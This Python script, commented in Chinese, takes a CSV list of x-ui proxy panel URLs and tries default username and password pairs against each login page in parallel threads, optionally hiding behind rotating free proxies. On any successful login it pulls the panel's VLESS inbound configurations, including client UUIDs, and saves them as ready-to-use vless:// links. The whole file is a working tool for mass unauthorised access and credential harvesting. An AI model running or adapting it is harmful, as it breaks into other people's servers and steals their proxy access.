import requests
import csv
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import urllib3
import json
import re
from urllib.parse import urlparse
import chardet  # 导入chardet库
from threading import Lock, current_thread
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
from bs4 import BeautifulSoup
import random

# 禁用 InsecureRequestWarning 警告
urllib3.disable_warnings(InsecureRequestWarning)

# 请求头信息
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Accept": "application/json, text/plain, */*",
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"
}

# 弱密码信息
USERNAME_LIST = ['admin', 'root', 'test']
PASSWORD_LIST = ['123456', 'admin', 'test']

# 锁对象，用于线程安全的文件写入和计数
write_lock = Lock()
counter_lock = Lock()
counter = 0

# 自定义重试配置
RETRY_TIMES = 3
RETRY_BACKOFF_FACTOR = 0.3

# 获取代理池
def fetch_proxies():
    url = 'https://free-proxy-list.net/'
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    table = soup.find('table')
    rows = table.find_all('tr')

    proxies = []

    for row in rows:
        cols = row.find_all('td')
        if cols:
            ip_address = cols[0].text.strip()
            port = cols[1].text.strip()
            https = cols[6].text.strip()

            # 根据https字段决定协议
            protocol = 'https' if https == 'yes' else 'http'

            # 将代理信息添加到列表中
            proxies.append((protocol, ip_address, int(port)))

    # 检查代理的可用性
    valid_proxies = []
    for proxy in proxies:
        protocol, ip, port = proxy
        try:
            response = requests.get('https://httpbin.org/ip', proxies={protocol: f"{protocol}://{ip}:{port}"}, timeout=5)
            if response.status_code == 200:
                valid_proxies.append(proxy)
        except:
            continue

    return valid_proxies

# 创建带有重试机制和代理的会话
def create_session(proxy=None):
    session = requests.Session()
    retries = Retry(
        total=RETRY_TIMES,
        backoff_factor=RETRY_BACKOFF_FACTOR,
        status_forcelist=[500, 502, 503, 504]
    )
    adapter = HTTPAdapter(max_retries=retries)
    session.mount('http://', adapter)
    session.mount('https://', adapter)

    if proxy:
        protocol, ip, port = proxy
        session.proxies = {protocol: f"{protocol}://{ip}:{port}"}

    return session

# 检测单个链接的弱密码
def check_weak_password(link, csv_writer, total_links, proxies, use_proxies):
    global counter
    proxy = random.choice(proxies) if use_proxies and proxies else None
    session = create_session(proxy)
    url = link + "/login"
    weak_password_found = False  # 标志变量
    max_retries = 3  # 最大重试次数
    retries = 0

    while retries < max_retries:
        try:
            for username in USERNAME_LIST:
                if weak_password_found:
                    break
                for password in PASSWORD_LIST:
                    if weak_password_found:
                        break
                    data = {
                        "username": username,
                        "password": password
                    }

                    response = session.post(url, headers=HEADERS, data=data, verify=False, timeout=10)
                    if response.status_code == 200 and '"success":true' in response.text:
                        print(f"Weak password detected: {link}")
                        weak_password_found = True  # 设置标志变量
                        vless_links = extract_v2ray_links(session, link)
                        if vless_links:
                            with write_lock:
                                for vless in vless_links:
                                    csv_writer.writerow({'link': link, 'vless': vless})
                                    print(f"VLESS Link: {vless}")  # 打印vless链接到控制台
                        else:
                            print(f"No VLESS links found for {link}")
            break  # 成功后退出循环
        except (requests.Timeout, requests.RequestException):
            print(f"Error accessing {link} with proxy {proxy}. Retrying...")
            retries += 1
            proxy = random.choice(proxies) if use_proxies and proxies else None
            session = create_session(proxy)

    with counter_lock:
        counter += 1
        print(f"Thread {current_thread().name} processed {counter}/{total_links} links")

# 提取 v2ray 链接
def extract_v2ray_links(session, link):
    vless_links = []
    try:
        response = session.post(link + "/xui/inbound/list", headers=HEADERS, verify=False, timeout=10)
        data_group = response.json().get('obj', [])

        for item in data_group:
            protocol = item['protocol']
            if protocol != "vless":
                continue

            port = str(item['port'])
            remark = str(item['remark'])

            setting = json.loads(item['settings'])
            streamSettings = json.loads(item['streamSettings'])
            v2id = str(setting['clients'][0]['id'])
            network = streamSettings['network']
            security = streamSettings['security']

            typee = re.findall(r'type": "(.*?)"', item['streamSettings'])
            host = re.findall(r'Host": "(.*?)"', item['streamSettings'])
            path = re.findall(r'path": "(.*?)"', item['streamSettings'])

            typee = typee[0] if typee else "none"
            host = host[0] if host else ""
            path = path[0] if path else ""
            add = urlparse(link).hostname

            if security == "tls":
                add = re.findall(r'serverName": "(.*?)"', item['streamSettings'])
                add = add[0] if add else urlparse(link).hostname

            flow = str(setting['clients'][0].get('flow', ''))
            vless = f"vless://{v2id}@{add}:{port}?type={network}&security={security}&flow={flow}&host={host}&path={path}&type={typee}#{remark}"
            vless_links.append(vless)

        print(f"Extracted {len(vless_links)} VLESS links from {link}")

    except Exception as e:
        print(f"Error extracting v2ray links from {link}: {e}")

    return vless_links

# 检测文件编码
def detect_file_encoding(file_path):
    with open(file_path, 'rb') as f:
        raw_data = f.read()
        result = chardet.detect(raw_data)
        return result['encoding']

# 读取 CSV 并提取链接
def read_links_from_csv(file_path):
    encoding = detect_file_encoding(file_path)
    links = []
    with open(file_path, newline='', encoding=encoding) as csvfile:
        reader = csv.DictReader(csvfile)
        for row in reader:
            links.append(row['link'])
    return links

# 主函数
def main(csv_file, num_threads, use_proxies):
    links = read_links_from_csv(csv_file)
    total_links = len(links)
    proxies = fetch_proxies() if use_proxies else []  # 获取代理池
    with open('weak_password_links.csv', 'w', newline='', encoding='utf-8', buffering=1) as csvfile:
        fieldnames = ['link', 'vless']
        csv_writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
        csv_writer.writeheader()

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            executor.map(lambda link: check_weak_password(link, csv_writer, total_links, proxies, use_proxies), links)

# 示例调用
if __name__ == "__main__":
    use_proxies = 0  # 设置为1使用代理池，设置为0不使用代理池
    main("xui.csv", num_threads=10, use_proxies=use_proxies)
